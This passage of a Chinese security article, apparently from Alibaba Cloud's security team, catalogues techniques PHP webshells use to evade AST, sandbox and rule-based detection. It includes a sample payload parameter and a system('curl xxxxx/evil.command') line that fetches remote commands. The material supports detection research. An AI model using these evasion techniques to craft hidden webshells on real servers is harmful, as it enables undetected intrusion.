  * php的不同trick之间近似于彼此正交的维度，通过对不同维度进行交叉组合，可以高效地写出大量的绕过样本
  * 有利于攻击者实现对防御者的单点突破，只要找到某个具体的绕过点，围绕这个绕过点，在其他维度上进行衍生，往往可以在短时间内创造出大量的绕过，方便在实战中迅速突破
## 2、模拟执行覆盖度攻击
业内目前针对PHP
Webshell，主流的做法是采用【静态/动态AST词法分析】或者【动态沙箱检测】技术，对这类防御手段来说，攻防博弈的战场在于【模拟引擎的完成度】，具体来说例如：
  * php各类版本、生僻语法的支持度
  * 打断污点追踪
  * 父子类数据共享
  * 引用传递
  * 未定义函数调用
  * 利用报错/容错机制
  * 控制流依赖逃逸
  * 宏定义传递
  * 等等….
我们选取几类重点讲解
### 2.1、控制流依赖逃逸
以下面这段代码为例：
可以看到，信息（外部参数）的传递并不是直接通过赋值/函数调用来传递的，而是通过控制流来隐式传递的，如果AST引擎或者沙箱不能正确地处理这种语法，则污点信息在传递过程中就会被丢失，导致最后在sink点无法有效检测。
### 2.2、利用报错/容错机制
### 2.3、引用传递
这个攻击方式是利用ReflectionFunction映射类配合引用参数修改$args的值，如果引擎没有很好地处理引用，则污点传递会被打断。
### 2.4、宏定义传递
利用宏变量，实现了外部参数的传递。
## 3、上下文环境依赖差分攻击
所谓上下文环境依赖差分攻击，是指攻击样本的运行需要依赖特定的上下文环境，从信息论角度来说，这可以理解为一种额外信息，攻防博弈的战场在于信息的获取。安全里面有一个俗话叫“要尽量在攻击发生的现场进行日志捕获、检测、以及防御”，很多离线检测方案，就是因为离第一攻击现场太远了，导致上下文环境信息丢失严重，造成了很多检测和防御上的困难。
### 3.1、多次运行后才会暴露出真实攻击意图
实际黑客利用时，需要运行多次样本才能触发真正攻击，而沙箱或者AST引擎往往只能运行有限次。即所谓的“黑客知道要怎么运行、用户也知道，就是防御方不知道”，这在实战中也是一个常用的绕过手段。
### 3.2、借助环境变量等第三方存储暂存外部参数
首先通过putenv传递变量，之后获取变量中的path内容，那么只需要传入c=path=phpinfo();即可完成利用。
这种样本在实际攻击中是容易成功的，因为只要是Linux操作系统，webserver进程一般都会有权限进行环境变量的操作。但是对于检测引擎来说，如果没有正确处理环境变量的存储和获取相关操作，污点参数就是传递失败。
## 4、攻击流量差分攻击
所谓的攻击流量差分攻击，是一种最常见的攻击绕过过段，其实也是一种思考问题的方式，突破防御，绕过的本质就是要寻找防御系统的差分点，对于PHP
Webshell来说，外部传参流量就是一个很关键的差分点。
为了更好地说明这个沙箱，笔者这里引入两个概念，【静态可重入样本】以及【动态不可重复多模态样本】。
所谓【静态可重入样本】就是指大部分的传统的PHP
Webshell样本，我们称之为“可重入单模态样本”，这类样本尽管可以利用php的大量tricky特性、使用各种编码、加密手段，代码形式可以极尽复杂，例如
–我是分隔符 m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m
m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m
m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m
m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m m
m m m m m m m m 结束–
但是，这种样本，究其根本，其本质都是“可重入的、单模态的”，就是说不管运行多少次，谁来运行（受害者 or 旁路离线引擎），其运行结果都是一样的。
从污点追踪理论的角度来说，这一阶段的沙箱，解决的是【显式污点传递问题】，即污点信息流的传递在样本代码中是显式的，只要模拟执行一遍即可100%模拟。
另一方面，对于【动态不可重复多模态样本】来说，这样样本的重点不在于利用了php的哪些tricky语法特性，而在于它的“不可重入性、多模态性”，我们下面用具体例子来解释。
### 4.1、动态依赖的分支跳转问题（根据输入的参数动态决定执行流和执行动作）
对这个样本来说，外部参数就像一个之路的地图，标识了一个“road chain”，只有严格遵守这个“road
chain”运行到最后，才可以看到样本的真实攻击意图。而这对业内很多旁路检测引擎来说，都是一个很大的挑战，在指数级的分支中，一旦走错了一个分支，就会被攻击者实现绕过。
### 4.2、基于外部参数动态生成函数名
主要攻击以沙箱和动态AST引擎为代表的旁路离线检测技术，离线检测因为丢失了攻击现场的上下文信息，因此较难模拟实际的攻击行为。
### 4.3、不常见的外部参数传递方式
对于业内常用的【污点追踪检测技术】，各家厂商基本都知道要把PHP常见的HTTP超参数标记为污点，例如GET/POST/COOKIE等。
但实际上，外部参数是一个泛概念，理论上来说，“一切外部可控的输入都是有害的，都需要被跟踪”。外部可控的输入源是一个信道的概念，原则上，只要是符合“外部可控、内容可控”这两个特点的方式，都属于外部可控输入。它们包括但不限于：
  * HTTP输入（GET/POST）参数
  *     * $GLOBALS[‘_GET’]
    * $GLOBALS[‘_POST’]
    * $GLOBALS[‘_COOKIE’]
    * $GLOBALS[‘_FILES’]
    * $GLOBALS[‘GLOBALS’][‘_GET’]
    * $GLOBALS[‘GLOBALS’][‘_POST’]
    * $GLOBALS[‘GLOBALS’][‘_COOKIE’]
    * $GLOBALS[‘GLOBALS’][‘_FILES’]
    * $_GET
    * $_POST
    * $_COOKIE
    * $_FILES
    * $_REQUEST
  * HTTP Header信息输入
  *     * getallheaders()
  * 网络信道输入：只要对源头api的return zval进行污点标记，随后污点标记会随着api sequence被传递
  *     * file_get_contents()
    * socket_create_listen()
    * socket_listen()
    * curl_init()
  * 通过系统指令包装器执行网络相关指令，从外部网络获取指令信息
  *     * system()：system(“curl xxxxx/evil.command”)
    * popen()
    * exec()
    * passthru()
    * shell_exec()
    * “
  * 通过数据库相关操作获取外部可控参数
举一个具体的例子来说：
### 4.4、外部参数依赖下的条件跳转
条件表达式依赖实际的攻击者传入，对于旁路离线检测，最大的挑战在于，因为缺少对应的参数，会陷入所谓的【分支覆盖问题】。
## 5、攻击静态检测规则
攻击静态检测规则就是我们常说的，绕过某某厂商的正则检测黑规则。这类攻击方式业内讨论的文章已经非常多了，笔者在这里不再赘述。
笔者希望在这里阐述一个攻击静态检测规则的方法论，即【利用冗余可约分性进行样本变形】。
观察如下3个表达式，将其视作webshell样本的一个逻辑抽象版本：
    ((X+6)+Y)+X + (if( (X*Y)>0 ){X}else{X} + X*X) + (X + (Y - (X + if(6>0){1}else{0})) )
# X*Y恒大于0，故可约简为：
    2*X + Y + 6 + X + X**2 + (X + (Y - (X + if(6>0){1}else{0})) )
# 6恒大于0，故可约简为：
    2*X + Y + 6 + X + X**2 + X + Y - X + 1
最后约简得到：
    X**2 + 3*X + 2*Y + 5
从最终结果，也就是功能上，上面3个表达式是相等的。
如果将最后一个表达式视为一个最精简版的webshell，例如：
根据冗余可约简规律，实现同样功能的这个代码，可以有无限多种扩展，这是不可枚举的。
例如：
阿里云安全-系统安全研发团队，以系统安全为核心，着力解决云上威胁检测和防御等问题。借助云平台优势，构建检测系统，每天处理海量样本。开发检测引擎，发现威胁并实现防御闭环，御敌于外。